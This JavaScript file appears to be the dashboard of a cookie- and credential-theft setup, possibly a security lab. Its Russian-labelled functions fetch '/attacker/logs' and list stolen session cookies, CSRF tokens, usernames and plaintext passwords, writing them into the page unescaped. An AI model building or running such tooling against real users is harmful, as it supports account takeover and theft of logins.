function fetchCookies() {
    fetch('/attacker/logs')
    .then(response => response.json())
    .then(data => {
        let cookiesList = document.getElementById("cookies-list");

        if (!Array.isArray(data.stolen_cookies) || data.stolen_cookies.length === 0) {
            cookiesList.innerHTML = "❌ Пока ничего не украдено.";
            return;
        }

        cookiesList.innerHTML = "<b>🕵️‍♂️ Украденные куки:</b><br><br>";

        data.stolen_cookies.forEach(item => {
            let id = item.id || "Неизвестно";
            let cookieText = item.cookie || "Неизвестно";
            let token = item.token || "Не украден";  // Добавлено поле token
            let stolenAt = item.stolen_at || "Неизвестно";

            let cookieDiv = document.createElement("div");
            cookieDiv.classList.add("cookie-item");
            cookieDiv.innerHTML = `
                <span class="id-icon">🆔</span> <strong>ID:</strong> ${id} <br>
                <span class="cookie-icon">🍪</span> <code>${cookieText}</code> <br>
                <span class="token-icon">🔑</span> <strong>CSRF-токен:</strong> ${token} <br>
                <span class="date-icon">📅</span> <b>Дата:</b> ${stolenAt} <br>
            `;
            cookiesList.appendChild(cookieDiv);
        });
    })
    .catch(error => {
        console.error("Ошибка при загрузке куки:", error);
        document.getElementById("cookies-list").innerHTML = "❌ Ошибка при загрузке.";
    });
}

function fetchCredentials() {
    fetch('/attacker/logs')
    .then(response => response.json())
    .then(data => {
        let credentialsList = document.getElementById("credentials-list");

        if (!Array.isArray(data.stolen_credentials) || data.stolen_credentials.length === 0) {
            credentialsList.innerHTML = "❌ Пока ничего не украдено.";
            return;
        }

        credentialsList.innerHTML = "<b>🕵️‍♂️ Украденные учетные данные:</b><br><br>";

        data.stolen_credentials.forEach(item => {
            let id = item.id || "Неизвестно";
            let username = item.username || "Неизвестно";
            let password = item.password || "Неизвестно";
            let stolenAt = item.stolen_at || "Неизвестно";

            let credDiv = document.createElement("div");
            credDiv.classList.add("credential-item");
            credDiv.innerHTML = `
                <span class="id-icon">🆔</span> <strong>ID:</strong> ${id} <br>
                <span class="user-icon">👤</span> <strong>Username:</strong> ${username} <br>
                <span class="lock-icon">🔒</span> <strong>Password:</strong> ${password} <br>
                <span class="date-icon">📅</span> <b>Дата:</b> ${stolenAt} <br>
            `;
            credentialsList.appendChild(credDiv);
        });
    })
    .catch(error => {
        console.error("Ошибка при загрузке учетных данных:", error);
        document.getElementById("credentials-list").innerHTML = "❌ Ошибка при загрузке.";
    });
}